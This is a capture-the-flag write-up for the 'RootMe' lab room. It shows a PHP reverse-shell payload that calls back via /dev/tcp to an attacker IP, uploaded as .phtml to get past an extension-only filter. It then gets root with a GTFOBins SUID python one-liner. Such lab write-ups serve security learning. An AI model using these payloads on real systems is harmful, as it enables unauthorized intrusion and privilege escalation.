# RootMe
---

## Initial Enumeration

As always, we start with some basic enumeration.

```bash
nmap -sV -sC 10.128.169.170
```

![](images/Pasted%20image%2020260626181428.png)

Next, let's enumerate the web directories.

```bash
gobuster dir -u 10.128.169.170 -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt
```

![](images/Pasted%20image%2020260626181534.png)

---

## Foothold

The upload functionality doesn't allow **.php** files, but it only checks the file extension rather than the file's contents.

That means we can simply rename our PHP reverse shell to **.phtml** and upload it instead.

```php
<?php
system("bash -c 'bash -i >& /dev/tcp/192.168.143.26/4444 0>&1'");
?>
```

![](images/Pasted%20image%2020260626182455.png)

![](images/Pasted%20image%2020260626182510.png)

Once the file is uploaded, we simply browse to it (or use `curl` if no browser is available) while listening for the incoming connection.

```bash
nc -lvnp 4444
```

![](images/Pasted%20image%2020260626182624.png)

And we're in.

---

## Privilege Escalation

With a shell, it's time for the usual Linux enumeration: checking directories, permissions, cron jobs, SUID binaries, listening ports, and anything else that might help.

To make transferring tools easier, I quickly spun up a simple HTTP server.

```bash
python -m SimpleHTTPServer 8010
```

![](images/Pasted%20image%2020260626183643.png)

Unfortunately, nothing interesting turned up at first.

![](images/Pasted%20image%2020260626183918.png)

At least we can grab the user flag while we're here.

Now let's focus on escalating our privileges.

While searching for SUID binaries, **python** immediately stands out, so the next stop is **GTFOBins**.

[https://gtfobins.org/gtfobins/python/](https://gtfobins.org/gtfobins/python/)

![](images/Pasted%20image%2020260726003834.png)

The recommended payload is:

```bash
python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
```

![](images/Pasted%20image%2020260626184647.png)

Running it instantly spawns a privileged shell.

All that's left is grabbing the root flag.

![](images/Pasted%20image%2020260626190158.png)

---

## Conclusion

A very straightforward Easy room. The foothold comes from bypassing an extension-based upload filter, and the privilege escalation is simply recognizing a SUID Python binary and knowing where to look. Short, simple, and a good reminder to always check GTFOBins when you find unusual SUID executables.

**— 0xchnk**